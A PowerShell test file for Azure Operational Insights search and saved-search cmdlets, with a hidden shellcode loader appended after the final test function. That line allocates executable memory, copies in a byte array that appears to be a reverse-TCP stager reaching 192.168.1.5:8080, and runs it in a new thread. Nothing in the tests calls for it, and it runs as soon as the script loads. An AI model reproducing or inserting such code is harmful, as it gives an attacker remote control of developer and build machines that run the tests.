














function Test-SearchGetSearchResultsAndUpdate
{
    $rgname = "mms-eus"
    $wsname = "188087e4-5850-4d8b-9d08-3e5b448eaecd"

	$top = 5

	$searchResult = Get-AzOperationalInsightsSearchResults -ResourceGroupName $rgname -WorkspaceName $wsname -Top $top -Query "*"

	Assert-NotNull $searchResult
	Assert-NotNull $searchResult.Metadata
	Assert-NotNull $searchResult.Value
	Assert-AreEqual $searchResult.Value.Count $top

	
	$stringType = "string".GetType()
	$valueType = $searchResult.Value.GetType()
	$valueIsString = $valueType.GenericTypeArguments.Contains($stringType)
	Assert-AreEqual $true $valueIsString

	$idArray = $searchResult.Id.Split("/")
	$id = $idArray[$idArray.Length-1]
	$updatedResult = Get-AzOperationalInsightsSearchResults -ResourceGroupName $rgname -WorkspaceName $wsname -Id $id
	
	Assert-NotNull $updatedResult
	Assert-NotNull $updatedResult.Metadata
	Assert-NotNull $searchResult.Value
}


function Test-SearchGetSchema
{
    $wsname = Get-ResourceName
    $dsName = Get-ResourceName
    $rgname = Get-ResourceGroupName
    $wslocation = Get-ProviderLocation

    New-AzResourceGroup -Name $rgname -Location $wslocation -Force

    
    $workspace = New-AzOperationalInsightsWorkspace -ResourceGroupName $rgname -Name $wsname -Location $wslocation -Sku premium -Force
	$schema = Get-AzOperationalInsightsSchema -ResourceGroupName $rgname -WorkspaceName $wsname
	Assert-NotNull $schema
	Assert-NotNull $schema.Metadata
	Assert-AreEqual $schema.Metadata.ResultType "schema"
	Assert-NotNull $schema.Value
}


function Test-SearchGetSavedSearchesAndResults
{
    $rgname = "mms-eus"
    $wsname = "188087e4-5850-4d8b-9d08-3e5b448eaecd"

	$savedSearches = Get-AzOperationalInsightsSavedSearch -ResourceGroupName $rgname -WorkspaceName $wsname
	
	Assert-NotNull $savedSearches
	Assert-NotNull $savedSearches.Value
	
	$idArray = $savedSearches.Value[0].Id.Split("/")
	$id = $idArray[$idArray.Length-1]

	$savedSearch = Get-AzOperationalInsightsSavedSearch -ResourceGroupName $rgname -WorkspaceName $wsname -SavedSearchId $id

	Assert-NotNull $savedSearch
	Assert-NotNull $savedSearch.ETag
	Assert-NotNull $savedSearch.Id
	Assert-NotNull $savedSearch.Properties
	Assert-NotNull $savedSearch.Properties.Query

	$savedSearchResult = Get-AzOperationalInsightsSavedSearchResults -ResourceGroupName $rgname -WorkspaceName $wsname -SavedSearchId $id

	Assert-NotNull $savedSearchResult
	Assert-NotNull $savedSearchResult.Metadata
	Assert-NotNull $savedSearchResult.Value
}


function Test-SearchSetAndRemoveSavedSearches
{
    $wsname = Get-ResourceName
    $dsName = Get-ResourceName
    $rgname = Get-ResourceGroupName
    $wslocation = Get-ProviderLocation

    New-AzResourceGroup -Name $rgname -Location $wslocation -Force

    
    $workspace = New-AzOperationalInsightsWorkspace -ResourceGroupName $rgname -Name $wsname -Location $wslocation -Sku premium -Force

	$id = "test-new-saved-search-id-2015"
	$displayName = "TestingSavedSearch"
	$category = "Saved Search Test Category"
	$version = 1
	$query = "* | measure Count() by Computer"

	
	$savedSearches = Get-AzOperationalInsightsSavedSearch -ResourceGroupName $rgname -WorkspaceName $wsname
	$count = $savedSearches.Value.Count
	$newCount = $count + 1
	$tags = @{"Group" = "Computer"}

	New-AzOperationalInsightsSavedSearch -ResourceGroupName $rgname -WorkspaceName $wsname -SavedSearchId $id -DisplayName $displayName -Category $category -Query $query -Tag $tags -Version $version -Force
	
	
	$savedSearches = Get-AzOperationalInsightsSavedSearch -ResourceGroupName $rgname -WorkspaceName $wsname
	Assert-AreEqual $savedSearches.Value.Count $newCount

	$etag = ""
	ForEach ($s in $savedSearches.Value)
	{
		If ($s.Properties.DisplayName.Equals($displayName)) {
			$etag = $s.ETag
		}
	}

	
	
	$query = "* | distinct Computer"
	Set-AzOperationalInsightsSavedSearch -ResourceGroupName $rgname -WorkspaceName $wsname -SavedSearchId $id -DisplayName $displayName -Category $category -Query $query -Tag $tags -Version $version -ETag $etag
	
	
	$savedSearches = Get-AzOperationalInsightsSavedSearch -ResourceGroupName $rgname -WorkspaceName $wsname
	Assert-AreEqual $savedSearches.Value.Count $newCount

	$found = 0
	$hasTag = 0
	ForEach ($s in $savedSearches.Value)
	{
		If ($s.Properties.DisplayName.Equals($displayName) -And $s.Properties.Query.Equals($query)) {
			$found = 1
			If ($s.Properties.Tags["Group"] -eq "Computer") {
				$hasTag = 1
			}
		}
	}
	Assert-AreEqual $found 1
	Assert-AreEqual $hasTag 1


	Remove-AzOperationalInsightsSavedSearch -ResourceGroupName $rgname -WorkspaceName $wsname -SavedSearchId $id
	
	
	$savedSearches = Get-AzOperationalInsightsSavedSearch -ResourceGroupName $rgname -WorkspaceName $wsname
	Assert-AreEqual $savedSearches.Value.Count $count
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

